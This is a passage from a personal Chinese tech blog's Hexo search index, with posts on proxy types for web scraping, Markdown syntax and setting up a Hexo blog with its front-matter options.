或让输入验证码的操作，隐藏自己的ip，是爬虫一个重要的机制<strong>代理也会在很多地方用到</strong></p><p>可以按照代理协议类型和代理匿名程度分类</p><ul><li>协议<ul><li>FTP代理服务器：一般有上传下载缓存功能，端口一般为21，2121等</li><li>HTTP代理服务器：主要用于访问网页，一般有内容过滤和缓存功能，端口一般为80,8080，3182等</li><li>SSL/TLS代理服务器：主要用于加密网站访问，有SSL，TLS加密功能，（最高支持128位加密）端口一般为443</li><li>RTSP代理服务器：主要用于访问Real流服务器，一般有缓存功能，端口为554</li><li>Telnet代理服务器：主要用于Telnet远程控制（黑客入侵电脑时常用于隐藏身份）端口23</li><li>POP3/SMTP:110/25端口</li><li>SOCKS代理：单纯传递数据包，不关心协议以及具体用法，速度快，端口一般为1080</li></ul></li><li>匿名程度<ul><li>高度匿名代理：数据包原封不动的转发，服务端看起来就像一个真实用户在操作</li><li>普通匿名代理：数据包上会做一些改动，可能会被发现是代理服务器且被发现真实ip</li><li>透明代理：不但改动了数据包还告诉了服务端真实ip，作用有通过代理提高访问速度，用内容过滤提高安全性</li><li>间谍代理：记录用户传输的数据，用以研究监控的代理服务器。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown语法笔记</title>
      <link href="/2020/09/01/markdown/"/>
      <url>/2020/09/01/markdown/</url>
      
        <content type="html"><![CDATA[<p>“#”用于标题，一个对应一级标题，两个对应二级标题，共六级</p><h3 id="这是一个三级标题"><a href="#这是一个三级标题" class="headerlink" title="这是一个三级标题"></a>这是一个三级标题</h3><hr><h4 id="字体以及段落"><a href="#字体以及段落" class="headerlink" title="字体以及段落"></a>字体以及段落</h4><p>“*”用于表示粗体，斜体，一对表示斜体，两对表示粗体，三对表示粗斜体，三个后回车是分隔线</p><p><em>斜体</em>  <strong>粗体</strong> <strong><em>粗斜体</em></strong>  </p><p>“~~”是删除线，括起来后是这样的  </p><p><del>这是删除线</del> </p><p>下划线使用html&lt;u&gt;,&lt;/u&gt;标签来进行使用，</p><p><u>这是下划线</u></p><p>脚注，是指当鼠标指向这里时会显示的标签[^]^后跟要注明的文本</p><p>Markdown 支持有序列表和无序列表。</p><p>无序列表使用星号(*<strong>**)、加号(</strong>+<strong>)或是减号(</strong>-**)作为列表标记，这些标记后面要添加一个空格，然后再填写内容：</p><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><ul><li>这是一个无需列表</li><li>这是第二列</li></ul><p>有序列表使用数字并加上 <strong>.</strong> 号来表示，</p><ol><li>这是第一</li><li>这是第二</li></ol><p>列表嵌套只需在子列表中的选项前面添加四个空格即可：</p><ol><li>这是第一<ul><li>这是子列表</li><li>第二行</li></ul></li><li>这是第二<ul><li>我这里没有使用添加空格，直接删除出现的3.再加*就可以了<ul><li>还可以继续往里<ol><li>可以多重嵌套</li></ol></li></ul></li></ul></li></ol><h4 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h4><p>区块，使用&gt;来区分，一个&gt;代表一个区块，也可以多重嵌套，注意要放在每行开头</p><blockquote><p>第一区块</p><p>这是区块中的内容</p><blockquote><ul><li>这是第二区块</li></ul></blockquote></blockquote><p>还可以在区块中使用列表</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>对于一个很短的代码片段，可以将其用两个“esc”下方键的·括起来，效果是这样的：<code>printf(&quot;helloworld/n&quot;);</code>这样的高亮进行标记</p><p>也可以使用一个TAB键或者四个空格作为代码</p><p>​    这是使用tab</p><p>​    这是使用四个空格</p><p>使用三对</p><p>“esc”下方键包裹起来语句，就可以是一个代码块了，还可以指定语言</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这就是一个代码块了</p><h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p>使用[     ]（  ），其中[   ]中是链接的名称(    )中是链接的地址</p><p>或者&lt;   &gt;中直接输入链接地址</p><p><a href="https://www.baidu.com/">百度</a> </p><p><a href="https://www.baidu.com/">https://www.baidu.com</a></p><h4 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h4><p><img src="/2020/09/01/markdown/From_C/桌面/tyoora/图片地址" alt="alt 属性文本"></p><p>这是图片格式</p><p>开头一个感叹号 !<br>接着一个方括号，里面放上图片的替代文字<br>接着一个普通括号，里面放上图片的网址，最后还可以用引号包住并加上选择性的 ‘title’ 属性的文字。</p><p>使用实例：</p><p><img src="http://static.runoob.com/images/runoob-logo.png" alt="RUNOOB 图标"></p><pre class="line-numbers language-none"><code class="language-none">![RUNOOB 图标](http:&#x2F;&#x2F;static.runoob.com&#x2F;images&#x2F;runoob-logo.png)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Markdown 还没有办法指定图片的高度与宽度，如果你需要的话，你可以使用普通的 <img> 标签。</p><pre class="line-numbers language-none"><code class="language-none">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;static.runoob.com&#x2F;images&#x2F;runoob-logo.png&quot; width&#x3D;&quot;50%&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="http://static.runoob.com/images/runoob-logo.png" width="50%"><p>注意，在typora中还可以直接将图片复制进来，很方便</p><h4 id="列表-1"><a href="#列表-1" class="headerlink" title="列表"></a>列表</h4><p>Markdown 制作表格使用 <strong>|</strong> 来分隔不同的单元格，使用 <strong>-</strong> 来分隔表头和其他行。</p><p>语法格式如下：</p><pre class="line-numbers language-none"><code class="language-none">|  表头   | 表头  ||  ----  | ----  || 单元格  | 单元格 || 单元格  | 单元格 |<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这就是一个列表的展示</p><table><thead><tr><th>表头</th><th>表头</th></tr></thead><tbody><tr><td>单元格</td><td>单元格</td></tr><tr><td>单元格</td><td>单元格</td></tr></tbody></table><ul><li><strong>-:</strong> 设置内容和标题栏居右对齐。</li><li><strong>:-</strong> 设置内容和标题栏居左对齐。</li><li><strong>:-:</strong> 设置内容和标题栏居中对齐。</li></ul><pre class="line-numbers language-none"><code class="language-none">| 左对齐 | 右对齐 | 居中对齐 || :-----| ----: | :----: || 单元格 | 单元格 | 单元格 || 单元格 | 单元格 | 单元格 |<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th align="left">左对齐</th><th align="right">右对齐</th><th align="center">居中对齐</th></tr></thead><tbody><tr><td align="left">单元格</td><td align="right">单元格</td><td align="center">单元格</td></tr><tr><td align="left">单元格</td><td align="right">单元格</td><td align="center">单元格</td></tr></tbody></table><h4 id="高级技巧"><a href="#高级技巧" class="headerlink" title="高级技巧"></a>高级技巧</h4><p>不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。</p><p>目前支持的 HTML 元素有：<code>&lt;kbd&gt; &lt;b&gt; &lt;i&gt; &lt;em&gt; &lt;sup&gt; &lt;sub&gt; &lt;br&gt;</code>等 ，</p><p>Markdown 使用了很多特殊符号来表示特定的意义，如果需要显示特定的符号则需要使用转义字符，Markdown 使用反斜杠转义特殊字符：</p><p>Markdown 支持以下这些符号前面加上反斜杠来帮助插入普通的符号：</p><pre class="line-numbers language-none"><code class="language-none">\   反斜线&#96;   反引号*   星号_   下划线&#123;&#125;  花括号[]  方括号()  小括号#   井字号+   加号-   减号.   英文句点!   感叹号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>f8为专注模式，f9为打字机模式，可以让在编写的行永远在最中间。</p>]]></content>
      
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/08/31/hello-world/"/>
      <url>/2020/08/31/hello-world/</url>
      
        <content type="html"><![CDATA[<h1 id="欢迎来到0xhowahh的博客"><a href="#欢迎来到0xhowahh的博客" class="headerlink" title="欢迎来到0xhowahh的博客"></a>欢迎来到0xhowahh的博客</h1><p>记录一下成功搭建好博客，这是第一篇博客，使用云服务器以及hexo搭建，希望在未来能记录自己在技术上的困惑以及解答进步，希望能在技术上有所突破<del>其实主要是因为服务器放着也是放着</del>，就算是一个云端的笔记存储吧，以后希望能写出高质量的博客</p><p><del>目前没有域名，先使用ip吧，等有空了买一个域名</del> </p><p>目前因为没有域名且一直无法通过git把东西传到云服务器上，可能是钩子出了点问题，暂时先试用github来托管，目前的域名为</p><p><a href="https://howahh.github.io/">https://howahh.github.io/</a></p><p><del>因为访问太慢了，所以最后还是部署到了云服务器上，域名暂时没有，还是使用ip直接访问</del></p><p><del><a href="http://119.23.18.158/">http://119.23.18.158/</a></del></p><p><del>先就这样，别的有空再整了</del></p><p><del>等有空了并且买了个域名再用云服务器吧</del></p><p>还是github好，不用维护</p><p>同时做一个简要记录</p><p>以下是hexo进行博客更新的流程</p><pre class="line-numbers language-none"><code class="language-none">hexo clean #clean一下hexo n &quot;name&quot;#创建名字为name的markdown文档hexo g#生成静态文件hexo s#本地展示，端口4000hexo d#向服务器部署#具体可在https:&#x2F;&#x2F;hexo.io&#x2F;zh-cn&#x2F;docs&#x2F;commands.html 中查看语法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以下是发布文章时的front-matter</p><h2 id="Hexo中文章-Front-matter-介绍"><a href="#Hexo中文章-Front-matter-介绍" class="headerlink" title="Hexo中文章 Front-matter 介绍"></a>Hexo中文章 Front-matter 介绍</h2><h3 id="Front-matter-选项详解"><a href="#Front-matter-选项详解" class="headerlink" title="Front-matter 选项详解"></a>Front-matter 选项详解</h3><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td>keywords</td><td>文章标题</td><td>文章关键字，SEO 时需要</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><blockquote><p><strong>注意</strong>:</p><ol><li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图<strong>各有特色</strong>。</li><li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href="http://tool.oschina.net/encrypt?type=2">开源中国在线工具</a>、<a href="http://encode.chahuo.com/">chahuo</a>、<a href="http://tool.chinaz.com/tools/hash.aspx">站长工具</a>。</li><li>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li></ol></blockquote><p>以下为文章的 <code>Front-matter</code> 示例。</p><h3 id="最简示例"><a href="#最简示例" class="headerlink" title="最简示例"></a>最简示例</h3><pre class="line-numbers language-none"><code class="language-none">---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="最全示例"><a href="#最全示例" class="headerlink" title="最全示例"></a>最全示例</h3><pre class="line-numbers language-none"><code class="language-none">---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00author: ahhimg: &#x2F;source&#x2F;images&#x2F;xxx.jpgtop: truecover: truecoverImg: &#x2F;images&#x2F;1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="解决图片上传问题"><a href="#解决图片上传问题" class="headerlink" title="解决图片上传问题"></a>解决图片上传问题</h3><p>解决了hexo图片上传的问题，之前的图片一直会挂掉，一直没有解决，找到了解决办法，没有使用图床和一些插件，因为我很多时候图片都是截图拉过来，感觉很麻烦，typora的设置就可以很简单的解决了，</p><ol><li><p>在hexo的source文件夹中新建images文件夹</p></li><li><p>在typora的图像设置中更改为自己的设置，插入图片时复制到相应路径，使用相对路径，使用../images这样无论是在本地还是在服务器上都可以找到我们的图片</p></li></ol><p><img src="/../images/image-20201006114223108.png" alt="typora设置"></p><ol start="3"><li>在每次新建博客文档的时候顶部配置项中加入一行</li></ol><pre class="line-numbers language-none"><code class="language-none">typora-root-url: ..&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就可以了，更好的办法是直接在hexo的scaffolds文件夹中的post文件中加上这一行（也可以加上别的想要的，比如auther），这样以后new的时候会自动生成这些配置。</p><ol start="4"><li>复制后的图片就可以直接Ctrl +c，Ctrl+v到typora中，在本地和远端都可以显示了。</li></ol><p><strong><em>2020/10/6</em></strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
